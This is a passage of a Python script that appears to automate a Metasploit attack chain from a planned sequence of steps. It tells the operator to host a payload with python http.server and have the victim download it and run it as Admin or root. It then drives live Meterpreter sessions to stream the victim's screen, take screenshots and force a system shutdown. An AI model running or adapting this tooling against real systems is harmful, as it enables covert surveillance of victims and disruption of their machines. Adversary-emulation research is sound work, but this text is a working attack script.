        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string2"] = user_input

    # Map LHOST to already collected HOST
    user_params["LHOST"] = user_params["HOST"]
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server {user_params["LPORT"]}

    (On victim's machine)
    1. Open {user_params["LHOST"]}:{user_params["LPORT"]} in the browser
    2. Navigate to the path of the target payload file
    3. Download the payload file
    4. Execute the payload file to {user_params["SAVE_PATH"]} as Admin (Root)

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[None] Step 20[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a Meterpreter Payload[/]")


    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 21[/]")
    console.print(f"[bold cyan]\n📌[Name] Remote Screen Capture[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 21 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: quality[/]")
    console.print(f"  Description: Image quality percentage (1-100)")
    default_val = ""
    required_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for quality (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: quality")
    user_params["quality"] = user_input

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: screenshare[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.screenshare(str(user_params["quality"]), str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[None] Step 22[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a Meterpreter Payload[/]")


    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 23[/]")
    console.print(f"[bold cyan]\n📌[Name] Capture Screen Image[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor2" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor2"]))
        user_params["Executor"] = pddl_parameters["executor2"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor2"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor2"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: screenshot[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.screenshot(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 24[/]")
    console.print(f"[bold cyan]\n📌[Name] Capture Screen Image[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor1" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor1"]))
        user_params["Executor"] = pddl_parameters["executor1"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor1"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor1"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: screenshot[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.screenshot(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 25[/]")
    console.print(f"[bold cyan]\n📌[Name] Force System Shutdown[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Metasploit executor if not already done
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        metasploit_sessionid = selected_session
        # Register in executor_dict as a primary Meterpreter executor
        executor_dict["executor0"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: shutdown[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.shutdown(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

if __name__ == "__main__":
    asyncio.run(main())
